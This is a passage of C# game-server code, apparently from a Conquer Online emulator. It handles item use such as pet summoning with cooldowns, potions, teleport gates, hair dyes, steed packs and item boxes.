                            entity.MaxAttack = entity.MagicAttack = monster.MaxAttack;
                            entity.Hitpoints = entity.MaxHitpoints = monster.Hitpoints;
                            entity.Body = monster.Mesh;
                            entity.Level = monster.Level;
                            entity.Defence = 20000;
                            entity.X = (ushort)(client.Entity.X - 2);
                            entity.Y = (ushort)(client.Entity.Y - 2);
                            entity.EntityFlag = MTA.Game.EntityFlag.Monster;
                            entity.MapID = client.Entity.MapID;
                            entity.SendUpdates = true;
                            client.Map.RemoveEntity(entity);
                            Network.GamePackets._String stringPacket = new MTA.Network.GamePackets._String(true);
                            stringPacket.UID = monster.ID;
                            stringPacket.Type = Network.GamePackets._String.Effect;
                            stringPacket.Texts.Add("MBStandard");
                            client.Map.AddEntity(entity);

                            client.Inventory.Remove(item, Enums.ItemUse.Remove);
                            break;
                        }
                        else
                        {
                            TimeSpan Remain = client.matrixtime.AddMinutes(5.0) - DateTime.Now;
                            string message = "Time Till Next Usage :";
                            message += string.Format("1} Minutes : {2} Seconds", Remain.Hours, Remain.Minutes, Remain.Seconds);
                            client.MessageBox(message, null, null);
                            break;
                        }
                    }


                #endregion
                #region CrazyGhost
                case 3001659:
                    {
                        if (DateTime.Now >= client.matrixtime.AddMinutes(5.0))
                        {
                            client.matrixtime = DateTime.Now;
                            client.Entity.Update(_String.Effect, "fam_gain_special", true);
                            Database.MonsterInformation monster = new MTA.Database.MonsterInformation();
                            monster.Hitpoints = 6000000;
                            monster.Level = 200;
                            monster.Mesh = 982;
                            monster.Name = "CrazyGhost";
                            monster.MaxAttack = 60000;
                            monster.AttackRange = 10;
                            monster.AttackType = 2;
                            monster.SpellID = 10304;
                            monster.AttackSpeed = 1000;
                            monster.ViewRange = 5;
                            monster.MoveSpeed = 500;
                            monster.RunSpeed = 500;
                            monster.MinAttack = 50000;
                            Game.Entity entity = new Game.Entity(Game.EntityFlag.Monster, false);
                            entity.MapObjType = Game.MapObjectType.Monster;
                            entity.MonsterInfo = monster;
                            entity.MonsterInfo.Owner = entity;
                            entity.Name = "CrazyGhost";
                            entity.MinAttack = monster.MinAttack;
                            entity.MaxAttack = entity.MagicAttack = monster.MaxAttack;
                            entity.Hitpoints = entity.MaxHitpoints = monster.Hitpoints;
                            entity.Body = monster.Mesh;
                            entity.Level = monster.Level;
                            entity.Defence = 20000;
                            entity.X = client.Entity.X;
                            entity.Y = client.Entity.Y;
                            entity.EntityFlag = MTA.Game.EntityFlag.Monster;
                            entity.MapID = client.Entity.MapID;
                            entity.SendUpdates = true;
                            client.Map.RemoveEntity(entity);
                            Network.GamePackets._String stringPacket = new MTA.Network.GamePackets._String(true);
                            stringPacket.UID = monster.ID;
                            stringPacket.Type = Network.GamePackets._String.Effect;
                            stringPacket.Texts.Add("MBStandard");
                            client.Map.AddEntity(entity);

                            client.Inventory.Remove(item, Enums.ItemUse.Remove);
                            break;
                        }
                        else
                        {
                            TimeSpan Remain = client.matrixtime.AddMinutes(5.0) - DateTime.Now;
                            string message = "Time Till Next Usage :";
                            message += string.Format("{1} Minutes : {2} Seconds", Remain.Hours, Remain.Minutes, Remain.Seconds);
                            client.MessageBox(message, null, null);
                            break;
                        }
                    }


                #endregion
                #region GoldenBird
                case 3001658:
                    {
                        if (DateTime.Now >= client.matrixtime.AddMinutes(5.0))
                        {
                            client.matrixtime = DateTime.Now;
                            client.Entity.Update(_String.Effect, "fam_exp_special", true);
                            Database.MonsterInformation monster = new MTA.Database.MonsterInformation();
                            monster.Hitpoints = 3500000;
                            monster.Level = 200;
                            monster.Mesh = 983;
                            monster.Name = "GoldenBird";
                            monster.MaxAttack = 40000;
                            monster.AttackRange = 10;
                            monster.AttackType = 2;
                            monster.SpellID = 10304;
                            monster.AttackSpeed = 1000;
                            monster.ViewRange = 5;
                            monster.MoveSpeed = 500;
                            monster.RunSpeed = 500;
                            monster.MinAttack = 30000;
                            Game.Entity entity = new Game.Entity(Game.EntityFlag.Monster, false);
                            entity.MapObjType = Game.MapObjectType.Monster;
                            entity.MonsterInfo = monster;
                            entity.MonsterInfo.Owner = entity;
                            entity.Name = "GoldenBird";
                            entity.MinAttack = monster.MinAttack;
                            entity.MaxAttack = entity.MagicAttack = monster.MaxAttack;
                            entity.Hitpoints = entity.MaxHitpoints = monster.Hitpoints;
                            entity.Body = monster.Mesh;
                            entity.Level = monster.Level;
                            entity.Defence = 20000;
                            entity.X = (ushort)(client.Entity.X - 2);
                            entity.Y = (ushort)(client.Entity.Y - 2);
                            entity.EntityFlag = MTA.Game.EntityFlag.Monster;
                            entity.MapID = client.Entity.MapID;
                            entity.SendUpdates = true;
                            client.Map.RemoveEntity(entity);
                            Network.GamePackets._String stringPacket = new MTA.Network.GamePackets._String(true);
                            stringPacket.UID = monster.ID;
                            stringPacket.Type = Network.GamePackets._String.Effect;
                            stringPacket.Texts.Add("MBStandard");
                            client.Map.AddEntity(entity);
                            client.Inventory.Remove(item, Enums.ItemUse.Remove);
                            break;
                        }
                        else
                        {
                            TimeSpan Remain = client.matrixtime.AddMinutes(5.0) - DateTime.Now;
                            string message = "Time Till Next Usage :";
                            message += string.Format("{1} Minutes : {2} Seconds", Remain.Hours, Remain.Minutes, Remain.Seconds);
                            client.MessageBox(message, null, null);
                            break;
                        }
                    }


                #endregion
                #region BloodGhost
                case 3001657:
                    {
                        if (DateTime.Now >= client.matrixtime.AddMinutes(5.0))
                        {
                            client.matrixtime = DateTime.Now;
                            client.Entity.Update(_String.Effect, "fam_gain", true);
                            Database.MonsterInformation monster = new MTA.Database.MonsterInformation();
                            monster.Hitpoints = 2500000;
                            monster.Level = 200;
                            monster.Mesh = 208;
                            monster.Name = "BloodGhost";
                            monster.MaxAttack = 30000;
                            monster.AttackRange = 10;
                            monster.AttackType = 2;
                            monster.SpellID = 10304;
                            monster.AttackSpeed = 1000;
                            monster.ViewRange = 5;
                            monster.MoveSpeed = 500;
                            monster.RunSpeed = 500;
                            monster.MinAttack = 20000;
                            Game.Entity entity = new Game.Entity(Game.EntityFlag.Monster, false);
                            entity.MapObjType = Game.MapObjectType.Monster;
                            entity.MonsterInfo = monster;
                            entity.MonsterInfo.Owner = entity;
                            entity.Name = "BloodGhost";
                            entity.MinAttack = monster.MinAttack;
                            entity.MaxAttack = entity.MagicAttack = monster.MaxAttack;
                            entity.Hitpoints = entity.MaxHitpoints = monster.Hitpoints;
                            entity.Body = monster.Mesh;
                            entity.Level = monster.Level;
                            entity.Defence = 20000;
                            entity.X = (ushort)(client.Entity.X - 2);
                            entity.Y = (ushort)(client.Entity.Y - 2);
                            entity.EntityFlag = MTA.Game.EntityFlag.Monster;
                            entity.MapID = client.Entity.MapID;
                            entity.SendUpdates = true;
                            client.Map.RemoveEntity(entity);
                            Network.GamePackets._String stringPacket = new MTA.Network.GamePackets._String(true);
                            stringPacket.UID = monster.ID;
                            stringPacket.Type = Network.GamePackets._String.Effect;
                            stringPacket.Texts.Add("MBStandard");
                            client.Map.AddEntity(entity);
                            client.Inventory.Remove(item, Enums.ItemUse.Remove);
                            break;
                        }
                        else
                        {
                            TimeSpan Remain = client.matrixtime.AddMinutes(5.0) - DateTime.Now;
                            string message = "Time Till Next Usage :";
                            message += string.Format("{1} Minutes : {2} Seconds", Remain.Hours, Remain.Minutes, Remain.Seconds);
                            client.MessageBox(message, null, null);
                            break;
                        }
                    }


                #endregion
                #region HumanAide
                case 3001656:
                    {
                        if (DateTime.Now >= client.matrixtime.AddMinutes(5.0))
                        {
                            client.matrixtime = DateTime.Now;
                            client.Entity.Update(_String.Effect, "fam_exp", true);
                            Database.MonsterInformation monster = new MTA.Database.MonsterInformation();
                            monster.Hitpoints = 1500000;
                            monster.Level = 200;
                            monster.Mesh = 209;
                            monster.Name = "HumanAide";
                            monster.MaxAttack = 20000;
                            monster.AttackRange = 10;
                            monster.AttackType = 2;
                            monster.SpellID = 10304;
                            monster.AttackSpeed = 1000;
                            monster.ViewRange = 5;
                            monster.MoveSpeed = 500;
                            monster.RunSpeed = 500;
                            monster.MinAttack = 10000;
                            Game.Entity entity = new Game.Entity(Game.EntityFlag.Monster, false);
                            entity.MapObjType = Game.MapObjectType.Monster;
                            entity.MonsterInfo = monster;
                            entity.MonsterInfo.Owner = entity;
                            entity.Name = "HumanAide";
                            entity.MinAttack = monster.MinAttack;
                            entity.MaxAttack = entity.MagicAttack = monster.MaxAttack;
                            entity.Hitpoints = entity.MaxHitpoints = monster.Hitpoints;
                            entity.Body = monster.Mesh;
                            entity.Level = monster.Level;
                            entity.Defence = 20000;
                            entity.X = client.Entity.X;
                            entity.Y = client.Entity.Y;
                            entity.EntityFlag = MTA.Game.EntityFlag.Monster;
                            entity.MapID = client.Entity.MapID;
                            entity.SendUpdates = true;
                            client.Map.RemoveEntity(entity);
                            Network.GamePackets._String stringPacket = new MTA.Network.GamePackets._String(true);
                            stringPacket.UID = monster.ID;
                            stringPacket.Type = Network.GamePackets._String.Effect;
                            stringPacket.Texts.Add("MBStandard");
                            client.Map.AddEntity(entity);
                            client.Inventory.Remove(item, Enums.ItemUse.Remove);
                            break;
                        }
                        else
                        {
                            TimeSpan Remain = client.matrixtime.AddMinutes(5.0) - DateTime.Now;
                            string message = "Time Till Next Usage :";
                            message += string.Format("{1} Minutes : {2} Seconds", Remain.Hours, Remain.Minutes, Remain.Seconds);
                            client.MessageBox(message, null, null);
                            break;
                        }
                    }


                #endregion
                #endregion
                #region DemonBoxs
                /*case 720650:
                    {
                        if (client.Entity.MapID == 1036)
                        {
                            client.Send(new Message("Sorry You can't open it In Market", System.Drawing.Color.Red, Message.TopLeft));
                            return;
                        }
                        Database.MonsterInformation mob;
                        Database.MonsterInformation.MonsterInformations.TryGetValue(2420, out mob);
                        client.Map.SpawnMonsterNearToHero(mob, client);
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        break;
                    }
                case 720651:
                    {
                        if (client.Entity.MapID == 1036)
                        {
                            client.Send(new Message("Sorry You can't open it In Market", System.Drawing.Color.Red, Message.TopLeft));
                            return;
                        }
                        Database.MonsterInformation mob;
                        Database.MonsterInformation.MonsterInformations.TryGetValue(2421, out mob);
                        client.Map.SpawnMonsterNearToHero(mob, client);
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        break;
                    }
                case 720652:
                    {
                        if (client.Entity.MapID == 1036)
                        {
                            client.Send(new Message("Sorry You can't open it In Market", System.Drawing.Color.Red, Message.TopLeft));
                            return;
                        }
                        Database.MonsterInformation mob;
                        Database.MonsterInformation.MonsterInformations.TryGetValue(2422, out mob);
                        client.Map.SpawnMonsterNearToHero(mob, client);
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        break;
                    }
                case 720671:
                    {
                        if (client.Entity.MapID == 1036)
                        {
                            client.Send(new Message("Sorry You can't open it In Market", System.Drawing.Color.Red, Message.TopLeft));
                            return;
                        }
                        Database.MonsterInformation mob;
                        Database.MonsterInformation.MonsterInformations.TryGetValue(2423, out mob);
                        client.Map.SpawnMonsterNearToHero(mob, client);
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        break;
                    }
                case 720672:
                    {
                        if (client.Entity.MapID == 1036)
                        {
                            client.Send(new Message("Sorry You can't open it In Market", System.Drawing.Color.Red, Message.TopLeft));
                            return;
                        }
                        Database.MonsterInformation mob;
                        Database.MonsterInformation.MonsterInformations.TryGetValue(2424, out mob);
                        client.Map.SpawnMonsterNearToHero(mob, client);
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        break;
                    }
                case 720673:
                    {
                        if (client.Entity.MapID == 1036)
                        {
                            client.Send(new Message("Sorry You can't open it In Market", System.Drawing.Color.Red, Message.TopLeft));
                            return;
                        }
                        Database.MonsterInformation mob;
                        Database.MonsterInformation.MonsterInformations.TryGetValue(2425, out mob);
                        client.Map.SpawnMonsterNearToHero(mob, client);
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        break;
                    }*/
                #endregion
                #region Medicine
                case 1000000:
                case 1000010:
                case 1000020:
                case 1000030:
                case 1002000:
                case 1002010:
                case 1002020:
                case 1002050:
                case 1000040:
                case 725065:
                    {
                        if (Constants.NoHp.Contains(client.Entity.MapID))
                        {
                            return;
                        }
                        if (client.Entity.NoDrugsTime > 0)
                        {
                            if (Time32.Now > client.Entity.NoDrugsStamp.AddSeconds(client.Entity.NoDrugsTime))
                            {
                                client.Entity.NoDrugsTime = 0;
                            }
                            else
                            {
                                return;
                            }
                        }
                        if (client.Entity.Hitpoints == client.Entity.MaxHitpoints)
                            return;
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.Hitpoints = Math.Min(client.Entity.Hitpoints + infos.BaseInformation.ItemHP, client.Entity.MaxHitpoints);
                        break;
                    }
                case 1001000:
                case 1001010:
                case 1001020:
                case 1001030:
                case 1001040:
                case 1002030:
                case 1002040:
                case 725066:
                    {
                        if (Constants.NoHp.Contains(client.Entity.MapID))
                        {
                            return;
                        }
                        if (client.Entity.NoDrugsTime > 0)
                        {
                            if (Time32.Now > client.Entity.NoDrugsStamp.AddSeconds(client.Entity.NoDrugsTime))
                            {
                                client.Entity.NoDrugsTime = 0;
                            }
                            else
                            {
                                return;
                            }
                        }
                        if (client.Entity.Mana == client.Entity.MaxMana)
                            return;
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.Mana = (ushort)Math.Min(client.Entity.Mana + infos.BaseInformation.ItemMP, client.Entity.MaxMana);
                        break;
                    }
                #endregion
                #region SmallLotteryTicketPack
                case 724002:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Inventory.Add(711504, 0, 3);
                        break;
                    }
                #endregion
                #region Gates
                case 1060020:
                    {
                        if (client.Entity.MapID == 601) return;
                        if (client.Map.BaseID == 6000 || client.Map.BaseID == 6001 || client.Map.BaseID == 1844 || client.Map.BaseID == 1801 || client.Map.BaseID == 8883 || client.Map.BaseID == 1005 && client.Entity.MapID != 1005 || client.Map.BaseID == 700)
                        {
                            client.Send(Constants.JailItemUnusable);
                            return;
                        }
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.Teleport(1002, 303, 278);
                        break;
                    }
                case 1060021:
                    {
                        if (client.Entity.MapID == 601) return;
                        if (client.Map.BaseID == 6000 || client.Map.BaseID == 6001 || client.Map.BaseID == 1844 || client.Map.BaseID == 1801 || client.Map.BaseID == 8883 || client.Map.BaseID == 1005 && client.Entity.MapID != 1005 || client.Map.BaseID == 700)
                        {
                            client.Send(Constants.JailItemUnusable);
                            return;
                        }
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.Teleport(1000, 500, 650);
                        break;
                    }
                case 1060022:
                    {
                        if (client.Entity.MapID == 601) return;
                        if (client.Map.BaseID == 6000 || client.Map.BaseID == 6001 || client.Map.BaseID == 1844 || client.Map.BaseID == 1801 || client.Map.BaseID == 8883 || client.Map.BaseID == 1005 && client.Entity.MapID != 1005 || client.Map.BaseID == 700)
                        {
                            client.Send(Constants.JailItemUnusable);
                            return;
                        }
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.Teleport(1020, 565, 562);
                        break;
                    }
                case 1060023:
                    {
                        if (client.Entity.MapID == 601) return;
                        if (client.Map.BaseID == 6000 || client.Map.BaseID == 6001 || client.Map.BaseID == 1844 || client.Map.BaseID == 1801 || client.Map.BaseID == 8883 || client.Map.BaseID == 1005 && client.Entity.MapID != 1005 || client.Map.BaseID == 700)
                        {
                            client.Send(Constants.JailItemUnusable);
                            return;
                        }
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.Teleport(1011, 188, 264);
                        break;
                    }
                case 1060024:
                    {
                        if (client.Entity.MapID == 601) return;
                        if (client.Map.BaseID == 6000 || client.Map.BaseID == 6001 || client.Map.BaseID == 1844 || client.Map.BaseID == 1801 || client.Map.BaseID == 8883 || client.Map.BaseID == 1005 && client.Entity.MapID != 1005 || client.Map.BaseID == 700)
                        {
                            client.Send(Constants.JailItemUnusable);
                            return;
                        }
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.Teleport(1015, 717, 571);
                        break;
                    }
                case 1060039:
                    {
                        if (client.Entity.MapID == 601) return;
                        if (client.Map.BaseID == 6000 || client.Map.BaseID == 6001 || client.Map.BaseID == 1844 || client.Map.BaseID == 1801 || client.Map.BaseID == 8883 || client.Map.BaseID == 1005 && client.Entity.MapID != 1005 || client.Map.BaseID == 700)
                        {
                            client.Send(Constants.JailItemUnusable);
                            return;
                        }
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.Teleport(1217, 535, 558);
                        break;
                    }
                #endregion
                #region Dyes
                case 723584:
                    {
                        if (client.Equipment.TryGetItem(3) == null)
                            return;
                        if (client.Equipment.TryGetItem(3).ID == 0)
                            return;
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Equipment.TryGetItem(3).Color = Game.Enums.Color.Black;
                        MTA.Database.ConquerItemTable.UpdateColor(client.Equipment.TryGetItem(3));
                        client.Equipment.TryGetItem(3).Mode = MTA.Game.Enums.ItemMode.Update;
                        client.Equipment.TryGetItem(3).Send(client);
                        client.Equipment.UpdateEntityPacket();
                        break;
                    }
                case 1060030:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.HairColor = 3;
                        break;
                    }
                case 1060040:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.HairColor = 9;
                        break;
                    }
                case 1060050:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.HairColor = 8;
                        break;
                    }
                case 1060060:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.HairColor = 7;
                        break;
                    }
                case 1060070:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.HairColor = 6;
                        break;
                    }
                case 1060080:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.HairColor = 5;
                        break;
                    }
                case 1060090:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.HairColor = 4;
                        break;
                    }
                #endregion
                #region Misc

                #region SteedPacks
                case 728525:
                case 728526:
                case 728527:
                    {
                        Npcs dialog = new Npcs(client);
                        dialog.Text("Hello. You can chose a horse: black, brown or white.");
                        dialog.Option("Black horse", 1);
                        dialog.Option("Brown horse", 2);
                        dialog.Option("White horse", 3);
                        dialog.Option("Nevermind.", 255);
                        dialog.Send();
                        client.ActiveNpc = item.ID;
                        break;
                    }
                case 723855:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        ConquerItem _item = new ConquerItem(true);
                        _item.ID = 300000;
                        Database.ConquerItemInformation _iteminfos = new Database.ConquerItemInformation(_item.ID, 0);
                        _item.Durability = _item.MaximDurability = _iteminfos.BaseInformation.Durability;
                        _item.Plus = 1;
                        _item.Effect = Game.Enums.ItemEffect.Horse;
                        _item.SocketProgress = 150 << 8 | 255 << 16;
                        client.Inventory.Add(_item, Game.Enums.ItemUse.CreateAndAdd);
                        break;
                    }
                case 723856:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        ConquerItem _item = new ConquerItem(true);
                        _item.ID = 300000;
                        Database.ConquerItemInformation _iteminfos = new Database.ConquerItemInformation(_item.ID, 0);
                        _item.Durability = _item.MaximDurability = _iteminfos.BaseInformation.Durability;
                        _item.Plus = 1;
                        _item.Effect = Game.Enums.ItemEffect.Horse;
                        _item.SocketProgress = 150 | 255 << 8;
                        client.Inventory.Add(_item, Game.Enums.ItemUse.CreateAndAdd);
                        break;
                    }
                case 723859:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        ConquerItem _item = new ConquerItem(true);
                        _item.ID = 300000;
                        Database.ConquerItemInformation _iteminfos = new Database.ConquerItemInformation(_item.ID, 0);
                        _item.Durability = _item.MaximDurability = _iteminfos.BaseInformation.Durability;
                        _item.Plus = 1;
                        _item.Effect = Game.Enums.ItemEffect.Horse;
                        _item.SocketProgress = 255 | 150 << 16;
                        client.Inventory.Add(_item, Game.Enums.ItemUse.CreateAndAdd);
                        break;
                    }
                case 723860:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        ConquerItem _item = new ConquerItem(true);
                        _item.ID = 300000;
                        Database.ConquerItemInformation _iteminfos = new Database.ConquerItemInformation(_item.ID, 0);
                        _item.Durability = _item.MaximDurability = _iteminfos.BaseInformation.Durability;
                        _item.Plus = 3;
                        _item.Effect = Game.Enums.ItemEffect.Horse;
                        _item.SocketProgress = 150 << 8 | 255 << 16;
                        client.Inventory.Add(_item, Game.Enums.ItemUse.CreateAndAdd);
                        break;
                    }
                case 723861:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        ConquerItem _item = new ConquerItem(true);
                        _item.ID = 300000;
                        Database.ConquerItemInformation _iteminfos = new Database.ConquerItemInformation(_item.ID, 0);
                        _item.Durability = _item.MaximDurability = _iteminfos.BaseInformation.Durability;
                        _item.Plus = 3;
                        _item.Effect = Game.Enums.ItemEffect.Horse;
                        _item.SocketProgress = 150 | 255 << 8;
                        client.Inventory.Add(_item, Game.Enums.ItemUse.CreateAndAdd);
                        break;
                    }
                case 723862:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        ConquerItem _item = new ConquerItem(true);
                        _item.ID = 300000;
                        Database.ConquerItemInformation _iteminfos = new Database.ConquerItemInformation(_item.ID, 0);
                        _item.Durability = _item.MaximDurability = _iteminfos.BaseInformation.Durability;
                        _item.Plus = 3;
                        _item.Effect = Game.Enums.ItemEffect.Horse;
                        _item.SocketProgress = 255 | 150 << 16;
                        client.Inventory.Add(_item, Game.Enums.ItemUse.CreateAndAdd);
                        break;
                    }
                case 723863:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        ConquerItem _item = new ConquerItem(true);
                        _item.ID = 300000;
                        Database.ConquerItemInformation _iteminfos = new Database.ConquerItemInformation(_item.ID, 0);
                        _item.Durability = _item.MaximDurability = _iteminfos.BaseInformation.Durability;
                        _item.Plus = 6;
                        _item.Effect = Game.Enums.ItemEffect.Horse;
                        _item.SocketProgress = 150 << 8 | 255 << 16;
                        client.Inventory.Add(_item, Game.Enums.ItemUse.CreateAndAdd);
                        break;
                    }
                case 723864:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        ConquerItem _item = new ConquerItem(true);
                        _item.ID = 300000;
                        Database.ConquerItemInformation _iteminfos = new Database.ConquerItemInformation(_item.ID, 0);
                        _item.Durability = _item.MaximDurability = _iteminfos.BaseInformation.Durability;
                        _item.Plus = 6;
                        _item.Effect = Game.Enums.ItemEffect.Horse;
                        _item.SocketProgress = 150 | 255 << 8;
                        client.Inventory.Add(_item, Game.Enums.ItemUse.CreateAndAdd);
                        break;
                    }
                case 723865:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        ConquerItem _item = new ConquerItem(true);
                        _item.ID = 300000;
                        Database.ConquerItemInformation _iteminfos = new Database.ConquerItemInformation(_item.ID, 0);
                        _item.Durability = _item.MaximDurability = _iteminfos.BaseInformation.Durability;
                        _item.Plus = 6;
                        _item.Effect = Game.Enums.ItemEffect.Horse;
                        _item.SocketProgress = 255 | 150 << 16;
                        client.Inventory.Add(_item, Game.Enums.ItemUse.CreateAndAdd);
                        break;
                    }
                case 723900:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        ConquerItem _item = new ConquerItem(true);
                        _item.ID = 300000;
                        Database.ConquerItemInformation _iteminfos = new Database.ConquerItemInformation(_item.ID, 0);
                        _item.Durability = _item.MaximDurability = _iteminfos.BaseInformation.Durability;
                        _item.Plus = 0;
                        _item.Effect = Game.Enums.ItemEffect.Horse;
                        _item.SocketProgress = 150 << 8 | 255 << 16;
                        client.Inventory.Add(_item, Game.Enums.ItemUse.CreateAndAdd);
                        break;
                    }
                case 723901:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        ConquerItem _item = new ConquerItem(true);
                        _item.ID = 300000;
                        Database.ConquerItemInformation _iteminfos = new Database.ConquerItemInformation(_item.ID, 0);
                        _item.Durability = _item.MaximDurability = _iteminfos.BaseInformation.Durability;
                        _item.Plus = 0;
                        _item.Effect = Game.Enums.ItemEffect.Horse;
                        _item.SocketProgress = 150 | 255 << 8;
                        client.Inventory.Add(_item, Game.Enums.ItemUse.CreateAndAdd);
                        break;
                    }
                case 723902:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        ConquerItem _item = new ConquerItem(true);
                        _item.ID = 300000;
                        Database.ConquerItemInformation _iteminfos = new Database.ConquerItemInformation(_item.ID, 0);
                        _item.Durability = _item.MaximDurability = _iteminfos.BaseInformation.Durability;
                        _item.Plus = 0;
                        _item.Effect = Game.Enums.ItemEffect.Horse;
                        _item.SocketProgress = 255 | 150 << 16;
                        client.Inventory.Add(_item, Game.Enums.ItemUse.CreateAndAdd);
                        break;
                    }
                #endregion
                #region LifeFruitBasket
                case 723725:
                    {
                        if (client.Inventory.Count <= 31)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.Inventory.Add(723726, 0, 10);
                        }
                        else
                            client.Send(Constants.FullInventory);
                        break;
                    }
                #endregion

                #region 7StarPouch
                case 725067:
                    {
                        if (client.Inventory.Count <= 40)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.Inventory.Add(725065, 0, 5);
                        }
                        else
                            client.Send(Constants.FullInventory);
                        break;
                    }
                #endregion
                #region SerenityPouch
                case 725068:
                    {
                        if (client.Inventory.Count <= 40)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.Inventory.Add(725066, 0, 5);
                        }
                        else
                            client.Send(Constants.FullInventory);
                        break;
                    }
                #endregion
                #region SpeedFrankoPack
                case 727000:
                    {
                        if (client.Inventory.Count <= 35)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.Inventory.Add(1050002, 0, 1);
                        }
                        else
                            client.Send(Constants.FullInventory);
                        break;
                    }
                #endregion
                #region LifeFruit
                case 723726:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.Hitpoints = client.Entity.MaxHitpoints;
                        client.Entity.Mana = client.Entity.MaxMana;
                        break;
                    }
                #endregion
                #region Amrita Box
                case 720010:
                    {
                        if (client.Inventory.Count <= 38)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.Inventory.Add(1000030, 0, 3);
                        }
                        else
                            client.Send(Constants.FullInventory);
                        break;
                    }
                #endregion
                #region Panacea Box
                case 720011:
                    {
                        if (client.Inventory.Count <= 38)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.Inventory.Add(1002000, 0, 3);
                        }
                        else
                            client.Send(Constants.FullInventory);
                        break;
                    }
                #endregion
                #region Ginseng Box
                case 720012:
                    {
                        if (client.Inventory.Count <= 38)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.Inventory.Add(1002010, 0, 3);
                        }
                        else
                            client.Send(Constants.FullInventory);
                        break;
                    }
                #endregion
                #region Vanilla Box
                case 720013:
                    {
                        if (client.Inventory.Count <= 38)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.Inventory.Add(1002020, 0, 3);
                        }
                        else
                            client.Send(Constants.FullInventory);
                        break;
                    }
                #endregion
                #region RecoveryPill Box
                case 720014:
                    {
                        if (client.Inventory.Count <= 38)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.Inventory.Add(1001030, 0, 3);
                        }
                        else
                            client.Send(Constants.FullInventory);
                        break;
                    }
                #endregion RecoveryPill
                #region SoulPill Box
                case 720015:
                    {
                        if (client.Inventory.Count <= 38)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.Inventory.Add(1001040, 0, 3);
                        }
                        else
                            client.Send(Constants.FullInventory);
                        break;
                    }
                #endregion
                #region RefreshingPill Box
                case 720016:
                    {
                        if (client.Inventory.Count <= 38)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.Inventory.Add(1002030, 0, 3);
                        }
                        else
                            client.Send(Constants.FullInventory);
                        break;
                    }
                #endregion
                #region ChantPill Box
                case 720017:
                    {
                        if (client.Inventory.Count <= 38)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.Inventory.Add(1002040, 0, 3);
                        }
                        else
                            client.Send(Constants.FullInventory);
                        break;
                    }
                #endregion
                #region Mil.Ginseng Box
                case 721330:
                    {
                        if (client.Inventory.Count <= 38)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.Inventory.Add(1002050, 0, 3);
                        }
                        else
                            client.Send(Constants.FullInventory);
                        break;
                    }
                #endregion
                #region ExpBall
                case 723700:
                    {
                        if (client.ExpBalls < 10)
                        {
                            if (client.Entity.Level < 137)
                            {
